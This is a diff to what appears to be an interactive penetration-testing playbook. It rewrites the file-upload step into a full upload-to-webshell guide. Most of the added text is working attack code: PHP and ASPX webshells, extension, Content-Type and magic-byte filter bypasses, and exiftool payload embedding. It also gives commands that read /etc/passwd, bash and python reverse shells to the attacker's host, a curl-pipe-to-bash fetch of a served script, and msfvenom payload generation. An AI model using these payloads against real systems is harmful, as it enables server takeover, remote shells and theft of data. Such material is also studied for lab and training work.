@@ -3601,28 +3601,167 @@ sqlmap -u "http://$IP/page?id=1" \
 
   file_upload: {
     phase: "WEB",
-    title: "File Upload",
-    body: "Test every bypass method systematically. MIME type, extension, magic bytes. Double extensions still work on misconfigured servers.",
-    cmd: `# Try in order:
-# 1. Plain .php upload
-# 2. Change Content-Type to image/jpeg
-# 3. Double extension: shell.php.jpg
-# 4. Alternate PHP: .php3 .php4 .phtml .phar
-# 5. Null byte (older PHP): shell.php%00.jpg
+    title: "File Upload → Webshell",
+    body: "Two problems to solve: (1) get the file accepted, (2) find where it landed. Work them in parallel. Check source code and intercept responses for upload paths before fuzzing blind.",
+    cmd: `# ── STEP 1: FIND WHERE FILES GO ───────────────────────
+# Check the page source BEFORE uploading — look for hints
+curl -s http://$ip/upload.php | grep -i "upload\\|path\\|dir\\|folder\\|dest"
 
-# GIF magic bytes bypass — saves as .gif but executes PHP
-GIF89a
-<?php system($_POST["cmd"]); ?>
-# Upload as shell.gif
+# After uploading a test file, check the response
+# Burp: look at the response body for a URL or path
+# Common paths to check immediately:
+curl http://$ip/uploads/test.txt
+curl http://$ip/upload/test.txt
+curl http://$ip/files/test.txt
+curl http://$ip/images/test.txt
+curl http://$ip/media/test.txt
+curl http://$ip/assets/test.txt
+curl http://$ip/static/test.txt
+curl http://$ip/data/test.txt
+curl http://$ip/tmp/test.txt
+curl http://$ip/temp/test.txt
 
-# If Burp intercept: swap filename after upload accepted
-# Or swap Content-Type mid-request`,
-    warn: null,
+# Fuzz for the upload directory after uploading
+ffuf -u http://$ip/FUZZ/test.txt \\
+  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\
+  -mc 200 -fs 0
+
+# If filename is preserved — fuzz with your filename
+ffuf -u http://$ip/FUZZ/shell.php \\
+  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\
+  -mc 200
+
+# Check if app reveals path in response headers or body
+curl -v http://$ip/upload.php -X POST -F "file=@test.txt" 2>&1 | grep -i "location\\|path\\|url\\|href"
+
+# ── STEP 2: PHP WEBSHELL PAYLOADS ─────────────────────
+# Simple command execution — GET parameter
+<?php system($_GET['cmd']); ?>
+
+# POST parameter (harder to detect in logs)
+<?php system($_POST['cmd']); ?>
+
+# Both GET and POST
+<?php system($_REQUEST['cmd']); ?>
+
+# Passthru — alternative to system()
+<?php passthru($_GET['cmd']); ?>
+
+# Shell_exec — returns output as string
+<?php echo shell_exec($_GET['cmd']); ?>
+
+# Exec — only returns last line
+<?php exec($_GET['cmd'], $out); echo implode("\n", $out); ?>
+
+# Full featured — accepts cmd via POST, shows output
+<?php if(isset($_POST['cmd'])){echo '<pre>'.shell_exec($_POST['cmd']).'</pre>';}?>
+
+# One-liner reverse shell via webshell
+# First: set up listener: sudo nc -lvnp 443
+# Then hit: http://$ip/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/443+0>%261'
+
+# ── STEP 3: BYPASS FILTER — EXTENSION ────────────────
+# Try in order:
+.php
+.php3
+.php4
+.php5
+.php7
+.phtml
+.phar
+.shtml
+.cgi
+
+# Double extension (server processes first dot)
+shell.php.jpg
+shell.php.png
+shell.php.gif
+
+# Null byte — older PHP/servers
+shell.php%00.jpg
+shell.php .jpg
+
+# Case variation
+shell.PHP
+shell.Php
+shell.pHp
+
+# ── STEP 4: BYPASS FILTER — CONTENT-TYPE ─────────────
+# In Burp — change Content-Type header after upload accepted
+# Change: application/x-php
+# To:     image/jpeg   OR   image/png   OR   image/gif
+
+# curl with spoofed content type
+curl http://$ip/upload.php \\
+  -F "file=@shell.php;type=image/jpeg"
+
+# ── STEP 5: MAGIC BYTES BYPASS ───────────────────────
+# Prepend image magic bytes so file reads as an image
+# GIF89a — most common bypass
+printf 'GIF89a
+<?php system($_GET["cmd"]); ?>' > shell.php.gif
+
+# PNG magic bytes
+printf '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > shell.png.php
+
+# JPEG magic bytes
+printf '\xff\xd8\xff<?php system($_GET["cmd"]); ?>' > shell.jpg.php
+
+# exiftool — embed PHP in image metadata
+exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
+mv image.jpg shell.php.jpg
+
+# ── STEP 6: EXECUTE THE SHELL ─────────────────────────
+# Simple command test
+curl "http://$ip/uploads/shell.php?cmd=id"
+curl "http://$ip/uploads/shell.php?cmd=whoami"
+curl "http://$ip/uploads/shell.php?cmd=ls+-la"
+
+# URL encode spaces and special chars
+curl "http://$ip/uploads/shell.php?cmd=cat+/etc/passwd"
+curl "http://$ip/uploads/shell.php?cmd=cat%20/etc/passwd"
+
+# POST method
+curl -X POST http://$ip/uploads/shell.php -d "cmd=id"
+
+# ── STEP 7: UPGRADE TO REVERSE SHELL ─────────────────
+# Listener on Kali
+sudo nc -lvnp 443
+
+# Bash reverse shell via webshell (URL encoded)
+curl "http://$ip/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/443+0>%261'"
+
+# Python reverse shell via webshell
+curl "http://$ip/uploads/shell.php?cmd=python3+-c+'import+socket,subprocess,os;s=socket.socket();s.connect(("$LHOST",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'"
+
+# Serve shell.sh and execute it
+echo 'bash -i >& /dev/tcp/$LHOST/443 0>&1' > shell.sh
+python3 -m http.server 8000
+# Then via webshell:
+curl "http://$ip/uploads/shell.php?cmd=curl+http://$LHOST:8000/shell.sh|bash"
+
+# ── STEP 8: WINDOWS ASPX / ASP SHELLS ────────────────
+# ASPX webshell — use for IIS targets
+# msfvenom generated:
+msfvenom -p windows/x64/shell_reverse_tcp \\
+  LHOST=$LHOST LPORT=443 -f aspx -o shell.aspx
+
+# Simple ASPX cmd shell (copy-paste)
+# <%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %>
+# <% Response.Write(new Process(){StartInfo=new ProcessStartInfo("cmd.exe","/c "+Request["cmd"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start().StandardOutput.ReadToEnd()); %>
+
+# Execute
+curl "http://$ip/uploads/shell.aspx?cmd=whoami"`,
+    warn: "Always check the HTTP response after uploading — the path is often in the response body or Location header. If you can't find the upload dir, upload a unique filename then fuzz for it. Magic bytes bypass works when server checks file content but not extension. exiftool embed is stealthier than a naked PHP file.",
     choices: [
-      { label: "Upload worked — got webshell", next: "reverse_shell" },
-      { label: "Blocked — combine with LFI to execute", next: "lfi" },
+      { label: "Got webshell executing commands", next: "reverse_shell" },
+      { label: "Uploaded but can't find the file", next: "web_fuzz_deep" },
+      { label: "Extension blocked — try LFI instead", next: "lfi" },
+      { label: "IIS target — ASPX path", next: "iis_aspx" },
+      { label: "Need to upgrade to reverse shell", next: "reverse_shell" },
     ],
   },
+
 
   lfi: {
     phase: "WEB",
